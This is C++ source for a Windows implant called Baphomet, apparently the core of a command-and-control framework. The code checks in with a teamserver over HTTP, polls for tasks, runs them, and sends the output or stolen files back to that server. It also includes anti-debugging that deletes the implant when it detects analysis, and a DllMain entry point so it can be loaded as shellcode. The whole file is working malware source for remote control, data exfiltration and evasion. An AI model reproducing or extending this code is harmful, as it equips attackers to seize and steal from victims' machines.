#include <main.hpp>
#pragma comment(lib,"winhttp.lib")
#pragma comment(lib,"netapi32.lib")


//
// for testing purposes. Needed this
//

#ifdef BAPHOMET_DEBUG
bool read_from_disk(const std::string& file_name, std::string& outbuff) {

    HANDLE hFile = CreateFileA(
        file_name.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if(hFile == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD file_size = GetFileSize(hFile, nullptr);
    if(file_size == INVALID_FILE_SIZE) {
        return false;
    }

    outbuff.resize(file_size);
    DWORD bytesread = 0;
    if(!ReadFile(
        hFile,
        outbuff.data(),
        file_size,
        &bytesread,
        nullptr
    ) || bytesread != file_size) {
        return false;
    }

    CloseHandle(hFile);
    return true;
}
#endif


bool
receive_commands(implant_context& ctx) {

    std::string task;

    auto _ = defer([&]() {
        if(ctx.hsession != nullptr) {
           WinHttpCloseHandle(ctx.hsession);
        }
        if(ctx.hconnect != nullptr) {
            WinHttpCloseHandle(ctx.hconnect);
        }
    });


    #pragma region init_connection
        if(!networking::http::open_session(ctx.hsession, std::wstring(ctx.user_agent.begin(), ctx.user_agent.end()) )) {
            DEBUG_PRINT("[!] Failed to open new HTTP session!");
            return false;
        }

        if(!networking::http::open_connection(std::wstring(ctx.server_addr.begin(), ctx.server_addr.end()), ctx.port, ctx.hsession, ctx.hconnect)) {
            DEBUG_PRINT("[!] Failed to establish connection with the teamserver.");
            return false;
        }

        if(!networking::http::send_object_message(
            ctx.hconnect,
            ctx.callback_object,
            "checkin",
            ctx.session_token,
            ctx.is_https,
            task
        )) {
            DEBUG_PRINT("[!] Initial teamserver checkin failed.");
            return false;
        }

        DEBUG_PRINT("[+] Successfully checked in with teamserver.\n");
        DEBUG_PRINT("[+] Address: %s Port: %u\n", ctx.server_addr.c_str(), ctx.port);
    #pragma endregion


    while(true) {
        obfus::sleep(ctx);

        #pragma region get_task
            task.clear();
            if(!networking::http::send_object_message(
                ctx.hconnect,
                ctx.callback_object,
                "get_task",
                ctx.session_token,
                ctx.is_https,
                task
            )) {
                DEBUG_PRINT("[*] no task.\n");
                continue;
            }

            DEBUG_PRINT("[+] recieved task: %s\n", task.c_str());
        #pragma endregion


        #pragma region indicate_exit
            if(task == std::string("die") + COMMAND_DELIMITER) {
                networking::http::send_object_message(
                    ctx.hconnect,
                    ctx.callback_object,
                    "indicate_exit",
                    ctx.session_token,
                    ctx.is_https,
                    task
                );

                break;
            }
        #pragma endregion


        #pragma region process_command
            auto [txt_output, file_to_upload, type] =  dispatch::process_command(task, COMMAND_DELIMITER, ctx);
            obfus::sleep(ctx);
            bool success = false;
        #pragma endregion


        #pragma region send_response
            if(type == output_type::PLAIN_TEXT) {
                DEBUG_PRINT("[+] Sending plain text response: %s\n", txt_output.c_str());
                success = networking::http::send_object_message(
                    ctx.hconnect,
                    ctx.callback_object,
                    "complete_task --result " + txt_output,
                    ctx.session_token,
                    ctx.is_https,
                    task
                );
            }

            if(type == output_type::FILE) {
                DEBUG_PRINT("[+] Sending file upload response...");
                success = networking::http::upload_file(
                    ctx.hconnect,
                    ctx.callback_object,
                    file_to_upload,
                    ctx.session_token,
                    ctx.is_https
                );
                CloseHandle(file_to_upload);
            }
        #pragma endregion


        if(success) {
            DEBUG_PRINT("[+] Successfully sent response to: %s\n", ctx.callback_object.c_str());
        } else {
            DEBUG_PRINT("[!] Failed to send response!\n");
        }
    }

    DEBUG_PRINT("[+] Exiting...\n");
    return true;
}




#pragma section(".baph", read, write)
__declspec(allocate(".baph")) char metadata[4096] = { "METADATA_BEGIN\0" };


#ifdef BAPHOMET_COMPILE_FOR_SHELLCODE

//
// It's important to note that some DllMain parameters here
// are not actually as they seem, IF and ONLY IF we are using my loader, not a different one (i.e Hasherezade's).
//
BOOL APIENTRY DllMain(
    HMODULE hModule,            // < this will be a pointer to the base of the mapped image sections
    DWORD  ul_reason_for_call,  // < this is irrelevant
    LPVOID lpReserved           // < this will be a pointer to the ORIGINAL place the payload was first loaded (before the copy)
) {


    if(metadata[0] == '\0') {   // < may prevent weird issues where the compiler optimizes out the metadata chunk.
        return FALSE;
    }

    if(lpReserved == nullptr || static_cast<PIMAGE_DOS_HEADER>(lpReserved)->e_magic != IMAGE_DOS_SIGNATURE) {
        DEBUG_PRINT("[!] Original image base (lpReserved) not passed correctly!\n");
        return FALSE;
    }

    if(hModule == nullptr) {
        DEBUG_PRINT("[!] Mapped sections (hModule) not passed correctly!\n");
        return FALSE;
    }


    implant_context ctx;
    ctx.original_base = lpReserved;
    ctx.implant_base  = static_cast<void*>(hModule);

    if(!tasking::init_config(metadata, ctx)) {
        return FALSE;
    }


    if(ctx.prevent_debugging) {
        DEBUG_PRINT("[*] Debug prevention on, checking debug state...\n");
        if(anti_analysis::being_debugged()) {
            DEBUG_PRINT("[!] Being debugged: True, deleting self...\n");
            anti_analysis::delete_self();
            ExitThread(0);
        }
        DEBUG_PRINT("[+] Being debugged: False. Continuing.\n");
    }


    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            DEBUG_PRINT("[+] process attach.\n");
            if(!receive_commands(ctx)) {
                return FALSE;
            }
            return TRUE;

        case DLL_THREAD_ATTACH:
            DEBUG_PRINT("[+] thread attach.\n");
            break;

        case DLL_THREAD_DETACH:
            DEBUG_PRINT("[+] thread detach.\n");
            break;

        case DLL_PROCESS_DETACH:
            DEBUG_PRINT("[+] process detach.\n");
            break;
    }

    return TRUE;
}

#else

int main() {

    implant_context ctx;
    ctx.original_base = GetModuleHandleW(nullptr);
    ctx.implant_base  = GetModuleHandleW(nullptr);


    if(!tasking::init_config(metadata, ctx)) {
        return EXIT_FAILURE;
    }


    if(ctx.prevent_debugging) {
        DEBUG_PRINT("[*] Debug prevention on, checking debug state...\n");
        if(anti_analysis::being_debugged()) {
            DEBUG_PRINT("[!] Being debugged: True, deleting self...\n");
            anti_analysis::delete_self();
            ExitProcess(0);
        }
        DEBUG_PRINT("[+] Being debugged: False. Continuing.");
    }


    if(!receive_commands(ctx)) {
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

#endif
